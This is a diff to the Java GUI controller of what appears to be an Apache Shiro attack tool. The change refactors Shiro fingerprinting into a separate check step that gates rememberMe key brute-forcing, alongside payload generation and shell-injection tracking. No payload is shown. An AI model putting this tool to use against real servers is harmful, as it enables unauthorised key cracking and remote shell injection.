@@ -38,7 +38,7 @@ import java.util.concurrent.Executors;
 public class Controller {
 
     @FXML
-    public Button scan;
+    public Button checkButton;
 
     @FXML
     public ChoiceBox method;
@@ -111,12 +111,15 @@ public class Controller {
     //标识shell有没有注入成功
     private boolean shell =false;
 
+    private boolean isShiro =false;
+
 
     public void initEvent() {
         method.setOnAction(event -> {
                     if (method.getValue().equals("POST")) {
                         postData.setDisable(false);
-                        logUtil.printInfoLog("post可直接使用burp抓到包。如果目标站点是https，请填写对应的URL！", false);
+                        logUtil.printInfoLog("请求的url会直接从报文里面提取host，如果不一致，请自行填入url。", false);
+                        logUtil.printInfoLog("post默认发送http，如果是https需要自行填入url", true);
                     }
                     if (method.getValue().equals("GET")) {
                         postData.setDisable(true);
@@ -168,13 +171,35 @@ public class Controller {
     }
 
     @FXML
-    public void startScan() {
+    public void check() {
+        // TODO: 2022/6/25 从爆破密钥copy过来的垃圾重复代码，不想抽离，不想优化。能用就行
+        try {
+            Platform.runLater(() -> checkButton.setDisable(true));
+            this.validAllDataAndSetConfig();
+            String url = paramsContext.get("url").toString();
+            String method = paramsContext.get("method").toString();
+            String rmeValue = paramsContext.get("rmeValue").toString();
+            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");
+            Map<String, Object> header = (Map<String, Object>) paramsContext.get("header");
+            if (header == null) {
+                header = new HashMap<>();
+            }
+            if (params == null) {
+                params = new HashMap<>();
+            }
 
-
-        scan.setDisable(true);
-
-        scan.setDisable(false);
-
+            logUtil.printInfoLog("开始检查目标是否用了shiro", false);
+            if (ShiroTool.shiroDetect(url, method, header, params, rmeValue)) {
+                logUtil.printSucceedLog("发现shiro特征");
+                isShiro =true;
+            } else {
+                logUtil.printAbortedLog("未发现shiro特征", false);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            Platform.runLater(() -> checkButton.setDisable(false));
+        }
     }
 
 
@@ -209,15 +234,14 @@ public class Controller {
                 params = new HashMap<>();
             }
 
-            logUtil.printInfoLog("开始检查目标是否用了shiro", false);
-            if (ShiroTool.shiroDetect(url, method, header, params, rmeValue)) {
-                logUtil.printSucceedLog("发现shiro特征");
+            if (isShiro){
                 pool.submit(new BurstJob(url, method, params, keys));
-            } else {
-                logUtil.printAbortedLog("未发现shiro特征", false);
-                logUtil.printInfoLog("停止爆破", true);
-                //burstKey.setDisable(false);
+            }else {
+                this.check();
+                if (isShiro)pool.submit(new BurstJob(url, method, params, keys));
             }
+
+
         } catch (Exception e) {
             e.printStackTrace();
         } finally {
@@ -263,7 +287,7 @@ public class Controller {
 
             byte[] payload = (byte[]) mtd.invoke(null, clazz1.getMethod("getPayload").invoke(clazz1));
 
-            System.out.println("payloadLen:"+payload.length);
+            //System.out.println("payloadLen:"+payload.length);
 
             Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
             String encryptData;
@@ -294,7 +318,7 @@ public class Controller {
                     logUtil.printData(data.replace("$", ""));
                 } else {
                     logUtil.printWarningLog("未获取到回显!", true);
-                    logUtil.printData(data);
+                    //logUtil.printData(data);
                 }
             }
 
@@ -435,13 +459,13 @@ public class Controller {
      */
     private void validAllDataAndSetConfig() {
         //logUtil.printInfoLog("检测参数中。。。。。",true);
-        String url = this.target.getText().trim();
+        String target = this.target.getText().trim();
         if (method.getValue().equals(Constants.METHOD_GET)) {
-            if (!Tools.checkTheURL(url)) {
+            if (!Tools.checkTheURL(target)) {
                 Tools.alert("URL检查", "URL格式不符合要求，示例：http://127.0.0.1:8080/login");
                 return;
             }
-            paramsContext.put("url", url);
+            paramsContext.put("url", target);
             paramsContext.put("method", Constants.METHOD_GET);
         } else {
             paramsContext.put("method", Constants.METHOD_POST);
@@ -452,6 +476,7 @@ public class Controller {
             }
             Request request = null;
             try {
+                //解析post包
                 request = HttpTool.parseRequest(requestBody);
             } catch (Exception e) {
                 // e.printStackTrace();
@@ -462,16 +487,13 @@ public class Controller {
                 paramsContext.put("header", request.getHeader());
                 paramsContext.put("params", request.getParams());
                 paramsContext.put("paramsStr", request.getParamsStr());
-                if (!Tools.checkTheURL(url) && request.getRequestUrl() == null) {
-                    Tools.alert("目标错误", "请输入url，或者输入完整的请求包");
-                }
 
-                if (Tools.checkTheURL(url)) {
-                    request.setRequestUrl(url);
-                } else {
-                    paramsContext.put("url", request.getRequestUrl());
+                if (Tools.checkTheURL(target)){
+                    paramsContext.put("url", target+request.getRequestUrl());
+                }else {
+                    paramsContext.put("url", "http://"+request.getHeader().get("Host").toString()+request.getRequestUrl());
                 }
-
+                logUtil.printSucceedLog("目标URL:"+paramsContext.get("url"));
             } else {
                 Tools.alert("HTTP请求格式错误", "请输入一个有效的HTTP请求");
             }
